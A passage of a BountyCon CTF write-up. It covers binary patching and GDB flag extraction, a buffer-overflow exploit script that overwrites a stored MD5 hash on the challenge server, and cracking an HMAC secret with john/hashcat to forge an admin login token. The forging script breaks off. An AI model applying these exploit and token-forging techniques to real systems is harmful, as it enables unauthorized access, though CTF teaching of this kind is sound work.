    <span class="c1">// runPayload() stores the flag in the memory of the process after decryption</span>
    <span class="n">runPayload</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Press any key to quit..."</span><span class="p">);</span>
    <span class="n">tcgetattr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_158</span><span class="p">);</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_lflag</span> <span class="o">=</span> <span class="n">local_158</span><span class="p">.</span><span class="n">c_lflag</span> <span class="o">&amp;</span> <span class="mh">0xfffffffd</span><span class="p">;</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_cc</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x01'</span><span class="p">;</span>
    <span class="n">local_158</span><span class="p">.</span><span class="n">c_cc</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="n">tcsetattr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_158</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// if a debugger is attached, it deletes itself</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="n">CONCAT44</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">iVar1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You need to patch the function so that the <code class="highlighter-rouge">if (local_15c == 6)</code> condition is reversed. In Ghidra, you can select any C code in the Decompilation window and it'll automatically select the corresponding assembly code in the left pane. Selecting the <code class="highlighter-rouge">if</code> statement will either select a <code class="highlighter-rouge">CMP</code> or <code class="highlighter-rouge">JZ</code> instruction in the assembly window:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                     LAB_00101588
00101588 83 bd ac        CMP        dword ptr [RBP + local_15c],0x6
         fe ff ff 06
0010158f 74 17           JZ         LAB_001015a8
</code></pre></div></div>

<p>You need to replace <code class="highlighter-rouge">JZ</code> (jump if zero) with <code class="highlighter-rouge">JNZ</code> (jump if not zero). Right click the <code class="highlighter-rouge">JZ</code> instruction and select "Patch Instruction". Replace <code class="highlighter-rouge">JZ</code> with <code class="highlighter-rouge">JNZ</code>. The hex representation of the instruction will change from <code class="highlighter-rouge">74 17</code> to <code class="highlighter-rouge">75 17</code>:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0010158f 75 17           JNZ        LAB_001015a8
</code></pre></div></div>

<p>Ghidra doesn't support <a href="https://github.com/NationalSecurityAgency/ghidra/issues/19">exporting patched ELF binaries at the time of writing</a> so to get a patched binary, you'll manually have to replace the bytes (<code class="highlighter-rouge">74 17</code> with <code class="highlighter-rouge">75 17</code>) using a hex editor or similar tool. I did it with <a href="https://www.sublimetext.com/">Sublime Text</a> and searched for the previous instruction's bytes: <code class="highlighter-rouge">ff ff 06</code></p>



<p>After patching the binary, you simply need to run it and search for "BountyCon" in the process memory. You can do this with <a href="https://www.gnu.org/software/gdb/">GDB</a> and <a href="https://github.com/hugsy/gef">GEF</a>.</p>



<p>Run <code class="highlighter-rouge">gdb anti_what_patched</code> and enter <code class="highlighter-rouge">run</code> or <code class="highlighter-rouge">r</code> to run the process.</p>



<p>When it says <code class="highlighter-rouge">Press any key to quit...</code>, press <kbd>Ctrl+C</kbd> to pause execution.</p>



<p>Search for the flag in memory by entering <code class="highlighter-rouge">grep BountyCon</code> (this is a GEF feature).</p>



<p><img src="/--/bountycon20/antiwhat/gdb.png" alt="Anti What GDB" /></p>



<blockquote>
  <p>BountyCon{JUDDpJ4K56wvdSH9tKFnbRzYeqT}</p>


</blockquote>

<h3 id="ghidra-is-cool--reversing--published-dec-18">Ghidra is Cool! â Reversing â published Dec 18</h3>

<blockquote>
  <p>This is just a warm up.</p>



  <p><a href="/--/bountycon20/attachments/ghidra_is_cool.tar.gz">ghidra_is_cool.tar.gz</a></p>


</blockquote>

<p>Download <code class="highlighter-rouge">ghidra_is_cool.tar.gz</code>, extract it and run <code class="highlighter-rouge">ghidra_is_cool</code>. You'll see it exits without outputting anything.</p>



<p>Now open it in <a href="https://www.ghidra-sre.org/">Ghidra</a> like the challenge name suggests.</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                     undefined entry()
     undefined         AL:1           &lt;RETURN&gt;
                     entry                                           XREF[4]:     Entry Point(*), 00400018(*), 
                                                                                  00400088(*), 
                                                                                  _elfSectionHeaders::00000050(*)  
00401000 74 16           JZ         LAB_00401018
00401002 75 14           JNZ        LAB_00401018
00401004 4c 8d 3c        LEA        R15,[s_Ghidra_is_cool!_0040108d]                 = "Ghidra is cool!"
         25 8d 10 
         40 00
0040100c 0f              ??         0Fh
0040100d 0f              ??         0Fh
0040100e 0f              ??         0Fh
0040100f 50              ??         50h    P
00401010 61              ??         61h    a
00401011 74              ??         74h    t
00401012 63              ??         63h    c
00401013 68              ??         68h    h
00401014 20              ??         20h     
00401015 6d              ??         6Dh    m
00401016 65              ??         65h    e
00401017 21              ??         21h    !
</code></pre></div></div>

<p>You'll see the <code class="highlighter-rouge">entry</code> function says <code class="highlighter-rouge">Patch me!</code> (although they're not valid instructions, they'll not be executed because of the jump instruction above).</p>



<p>Click on a few instructions below that and you'll see a new function in the Decompilation window:</p>


<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">UndefinedFunction_0040101a</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar2</span><span class="p">;</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar3</span><span class="p">;</span>
  
  <span class="n">pbVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x401065</span><span class="p">;</span>
  <span class="n">pbVar3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_00402000</span><span class="p">;</span>
  <span class="n">lVar1</span> <span class="o">=</span> <span class="mh">0x28</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="c1">// presence of XOR strongly hints at encryption/decryption</span>
    <span class="o">*</span><span class="n">pbVar3</span> <span class="o">=</span> <span class="o">*</span><span class="n">pbVar2</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">lVar1</span><span class="p">;</span>
    <span class="n">pbVar2</span> <span class="o">=</span> <span class="n">pbVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">pbVar3</span> <span class="o">=</span> <span class="n">pbVar3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">lVar1</span> <span class="o">=</span> <span class="n">lVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">syscall</span><span class="p">();</span>
  <span class="n">syscall</span><span class="p">();</span>
  <span class="n">halt_baddata</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function might possibly be decrypting the flag with XOR operations. If you could run the binary and jump to this function, the flag might be printed. You can do this with <a href="https://www.gnu.org/software/gdb/">GDB</a> (highly recommend installing <a href="https://github.com/hugsy/gef">GEF</a> as well).</p>



<p>Here's a quick primer on some GDB commands you'll need for this challenge:</p>



<ol>
  <li><code class="highlighter-rouge">break ADDRESS</code>: put a breakpoint on that address so that execution pauses when that address is reached</li>
  <li><code class="highlighter-rouge">run</code> (or <code class="highlighter-rouge">r</code>): run the binary</li>
  <li><code class="highlighter-rouge">jump ADDRESS</code> (or <code class="highlighter-rouge">j ADDRESS</code>): jump to any address</li>
</ol>

<p>Run <code class="highlighter-rouge">gdb ghidra_is_cool</code>. This will tell <code class="highlighter-rouge">gdb</code> that you want to debug the <code class="highlighter-rouge">ghidra_is_cool</code> binary. GDB won't run it automatically.</p>



<p>Put a breakpoint on the first instruction of the entry function by entering <code class="highlighter-rouge">break *0x401000</code>.</p>



<p>Run the <code class="highlighter-rouge">ghidra_is_cool</code> binary by entering <code class="highlighter-rouge">r</code>. The breakpoint will be hit and execution will stop.</p>



<p>You can now jump to any instruction. The function you discovered above starts at <code class="highlighter-rouge">0x40101a</code> so jump to it by entering <code class="highlighter-rouge">j *0x40101a</code>.</p>



<p>The flag will be printed and the process will exit:</p>



<p><img src="/--/bountycon20/ghidraiscool/gdb.png" alt="Ghidra is Cool GDB" /></p>



<blockquote>
  <p>BountyCon{2H92Kr7QtkzHHnEcA6GeGzpLLnZ}</p>


</blockquote>

<h3 id="secure-login--pwn--published-dec-18">Secure Login â Pwn â published Dec 18</h3>

<blockquote>
  <p>We developed a super secure login system, but unfortunately we aren't familiar with those newfangled memory-safe languages.</p>



  <p>nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000</p>



  <p><a href="/--/bountycon20/attachments/secure_login.tar.gz">secure_login.tar.gz</a></p>


</blockquote>

<p>Download <code class="highlighter-rouge">secure_login.tar.gz</code>, extract it and open <code class="highlighter-rouge">secure_login</code> in <a href="https://www.ghidra-sre.org/">Ghidra</a>. If you run <code class="highlighter-rouge">secure_login</code> directly, it'll simply listen for connections on <code class="highlighter-rouge">localhost:10000</code> and you can connect to it by running <code class="highlighter-rouge">nc localhost 10000</code>.</p>



<p>It has many functions and a lot of networking related code. You'll find only the <code class="highlighter-rouge">check_passwd</code> function is worth looking into:</p>



<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">check_passwd</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_b8</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_b0</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_a8</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_a0</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_98</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_90</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_88</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_80</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_78</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_70</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="n">uchar</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_b8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_b0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_a8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_a0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_98</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_90</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_88</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_80</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_78</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_70</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_60</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_38</span> <span class="o">=</span> <span class="mh">0xa99dd1dbed586201</span><span class="p">;</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="mh">0xc6bbb0b969f29e4d</span><span class="p">;</span>
  <span class="c1">// echo "Password: "</span>
  <span class="n">write</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"Password: "</span><span class="p">,</span><span class="mh">0xb</span><span class="p">);</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="c1">// read 0x90 (144) bytes and store at `local_b8`</span>
    <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_b8</span><span class="p">,</span><span class="mh">0x90</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// calculate MD5 hash of 0x80 (128) bytes starting at `local_b8`</span>
    <span class="n">MD5</span><span class="p">((</span><span class="n">uchar</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_b8</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
    <span class="c1">// compare MD5 hash (`local_38` and `local_30`) with the calculated hash</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
  <span class="c1">// echo flag</span>
  <span class="c1">// it's redacted in the downloadable version obviously or this wouldn't be a pwn challenge</span>
  <span class="n">write</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"BountyCon{XXXXXXXXXXXXXXXXXXXXXXXXXXX}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>While reversing, it's a good idea to add comments after each line of code that you've understood and rename variables so that they make more sense.</p>



<p>After "Password: " is echoed, 144 bytes are read starting at <code class="highlighter-rouge">local_b8</code>. Since the size of <code class="highlighter-rouge">local_b8</code> is just 8 bytes (<code class="highlighter-rouge">undefined8</code>), a buffer overflow happens and all variables following <code class="highlighter-rouge">local_b8</code>, <code class="highlighter-rouge">local_b0</code> to <code class="highlighter-rouge">local_30</code>, are overwritten with bytes you send. The crucial part is being able to overwrite <code class="highlighter-rouge">local_38</code> and <code class="highlighter-rouge">local_30</code> which contain the constant MD5 hash.</p>



<p>I tried looking up the MD5 hash <code class="highlighter-rouge">a99dd1dbed586201c6bbb0b969f29e4d</code> in rainbow tables when I didn't understand the code fully. It's very likely to be hashed from 128 random bytes.</p>



<p>You just need to send any 128 bytes of data followed by the MD5 hash of that data. The data is 128 bytes and the MD5 hash is 16 bytes, totalling 144 bytes.</p>



<p>I wrote a script for this using the <a href="http://docs.pwntools.com/en/stable/">pwntools</a> library:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">gen_payload</span><span class="p">():</span>
  <span class="n">PAYLOAD_LEN</span> <span class="o">=</span> <span class="mi">144</span>
  <span class="n">MD5_LEN</span> <span class="o">=</span> <span class="mi">16</span>

  <span class="n">pwd</span> <span class="o">=</span> <span class="s">"Kishan Bagaria "</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># can be anything random
</span>  <span class="n">pwd</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">PAYLOAD_LEN</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span> <span class="o">-</span> <span class="n">MD5_LEN</span><span class="p">)</span>

  <span class="n">newhash</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">hashes</span><span class="o">.</span><span class="n">md5sum</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>

  <span class="n">payload</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">newhash</span>

  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">!=</span> <span class="n">PAYLOAD_LEN</span><span class="p">:</span>
    <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'invalid payload length'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

  <span class="k">return</span> <span class="n">payload</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'ec2-3-11-37-224.eu-west-2.compute.amazonaws.com'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s">'Password: '</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python2 flag.py
Kishan Bagaria Kishan Bagaria Kishan Bagaria Kishan Bagaria Kishan Bagaria Kishan Bagaria Kishan Bagaria Kishan Bagaria <span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>feï¿½[ï¿½q<span class="nv">$ï¿½</span>uï¿½DL#ï¿½M
<span class="o">[</span>+] Opening connection to ec2-3-11-37-224.eu-west-2.compute.amazonaws.com on port 10000: Done
Password: <span class="se">\x</span>00
<span class="o">[</span>+] Receiving all data: Done <span class="o">(</span>40B<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to ec2-3-11-37-224.eu-west-2.compute.amazonaws.com port 10000
BountyCon<span class="o">{</span>b7ZjqyxX9W9TP3hYSkewxKSbCnn<span class="o">}</span>
<span class="se">\x</span>00
</code></pre></div></div>

<p>You can also send the payload by piping:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">gen_payload</span><span class="p">():</span>
  <span class="n">PAYLOAD_LEN</span> <span class="o">=</span> <span class="mi">144</span>
  <span class="n">MD5_LEN</span> <span class="o">=</span> <span class="mi">16</span>

  <span class="n">pwd</span> <span class="o">=</span> <span class="s">"Kishan Bagaria "</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># can be anything random
</span>  <span class="n">pwd</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">PAYLOAD_LEN</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span> <span class="o">-</span> <span class="n">MD5_LEN</span><span class="p">)</span>

  <span class="n">newhash</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">hashes</span><span class="o">.</span><span class="n">md5sum</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>

  <span class="n">payload</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">newhash</span>

  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">!=</span> <span class="n">PAYLOAD_LEN</span><span class="p">:</span>
    <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'invalid payload length'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

  <span class="k">return</span> <span class="n">payload</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">()</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python2 echo_payload.py | nc ec2-3-11-37-224.eu-west-2.compute.amazonaws.com 10000
Password: BountyCon<span class="o">{</span>b7ZjqyxX9W9TP3hYSkewxKSbCnn<span class="o">}</span>
</code></pre></div></div>

<h3 id="i-dont-play--web--published-dec-18">I Don't Play â Web â published Dec 18</h3>

<blockquote>
  <p><a href="https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2">https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2</a></p>


</blockquote>

<p>TL;DR: Find HMAC-SHA256 hash, crack it by brute forcing with <a href="https://www.openwall.com/john/">john</a> or <a href="https://github.com/hashcat/hashcat">hashcat</a> using a wordlist like <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz">rockyou</a></p>



<p>This challenge simulates an identity provider or a site that handles the login and on a successful login, redirects you to another site providing the authentication token to it (think somewhat like "Login with Facebook"). Initials of this challenge's name is IDP which is an abbreviation of identity provider.</p>



<p><img src="/--/bountycon20/idontplay/idp-landing.png" alt="I Don't Play" height="198" class="centered-img" /></p>



<p>Click "login" and you'll be redirected to the site that has the login form and implements the authentication:</p>



<p><a href="https://8getj7mzk7.execute-api.eu-west-2.amazonaws.com/default/gbh5ew?url=https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2">https://8getj7mzk7.execute-api.eu-west-2.amazonaws.com/default/gbh5ew?url=https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2</a></p>



<p><img src="/--/bountycon20/idontplay/idp-identity-provider.png" alt="I Don't Play Login Form" height="368" class="centered-img" /></p>



<p>Clicking "Login" with an empty form or entering a wrong username or password will show this:</p>



<p><img src="/--/bountycon20/idontplay/idp-bad.png" alt="I Don't Play Bad Username/Password" height="198" class="centered-img" /></p>



<p>Click "Cancel" in the login form and you'll be redirected to:</p>



<p><a href="https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D">https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D</a></p>



<p>Notice that an <code class="highlighter-rouge">AUTH_TOKEN</code> param has been appended to the URL:</p>



<blockquote>
  <p>%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D</p>


</blockquote>

<p>Inspect the source and you'll see there's a hint on how the <code class="highlighter-rouge">AUTH_TOKEN</code> is constructed in a comment:</p>



<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- AUTH_TOKEN=url_encode(username;base64(hmac-sha256(username))) --&gt;</span>
</code></pre></div></div>

<p>You have a username and a HMAC-SHA256 hash in base64 delimited by a semicolon and the whole thing is URL encoded.</p>



<p>URL decode the token:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=
</code></pre></div></div>

<p>HMAC functions require a secret (or key) and a message. The message here is the username, which is an empty string. The secret is unknown. If you knew the secret, you could login as any user. What if you could crack the secret?</p>



<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)To_Hex('None')&amp;input=Rlpib2NCZFJOVWRITmUyc1luQ1gwNU9zblNiUnF0UFJzY3ZsbHpiTFRCOD0">Convert the base64 part (<code class="highlighter-rouge">FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=</code>) into hex/base16</a> since hashes are more commonly represented in hex:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1596e870175135474735edac627097d393ac9d26d1aad3d1b1cbe59736cb4c1f
</code></pre></div></div>

<p>You can now crack this hash using a tool like <a href="https://www.openwall.com/john/">john</a> or <a href="https://github.com/hashcat/hashcat">hashcat</a> with a big password wordlist like <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz">rockyou</a>.</p>



<p>For john, save <code class="highlighter-rouge">#1596e870175135474735edac627097d393ac9d26d1aad3d1b1cbe59736cb4c1f</code> to a file named <code class="highlighter-rouge">hashfile</code> and run:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>wordlists/rockyou.txt hashfile
</code></pre></div></div>

<p>For hashcat, run:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1450 <span class="nt">-a</span> 0 1596e870175135474735edac627097d393ac9d26d1aad3d1b1cbe59736cb4c1f: wordlists/rockyou.txt
</code></pre></div></div>

<p>It'll soon output <code class="highlighter-rouge">ilovefacebook</code>, which is the secret used in the HMAC-SHA256 function. Since you have the secret now, you can correctly generate <code class="highlighter-rouge">AUTH_TOKEN</code> with any username.</p>



<p>I wrote a script to generate the <code class="highlighter-rouge">AUTH_TOKEN</code> and send a request with it:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">SECRET</span> <span class="o">=</span> <span class="s">'ilovefacebook'</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">'admin'</span> <span class="c1"># since it's the most common username. if this didn't work, you could have used a username wordlist here
</span>
<span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">SECRET</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">),</span> <span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">),</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
<span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">h</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
